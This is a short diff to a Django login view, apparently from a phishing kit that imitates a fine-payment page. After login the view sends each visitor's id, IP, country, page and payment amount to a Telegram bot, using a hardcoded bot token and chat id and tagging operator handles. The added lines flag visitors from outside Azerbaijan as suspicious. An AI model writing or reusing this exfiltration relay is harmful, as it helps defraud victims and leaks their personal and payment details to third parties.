@@ -42,6 +42,8 @@ def login(request):
         request.session['contact_id'] = contact.id
         ip_address = client_ip
         country = get_country_from_ip(ip_address)
+        if country!= "AZ":
+            country= 'Şübhəli İP!'
         response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{contact.ip}|Country|{country}\nPage:{contact.page_name}\nMəbləğ:{subtotal}\n  @kitayskiadam @TetaLab @alienfx')
 
         return render(request, 'cerime2.html',context)
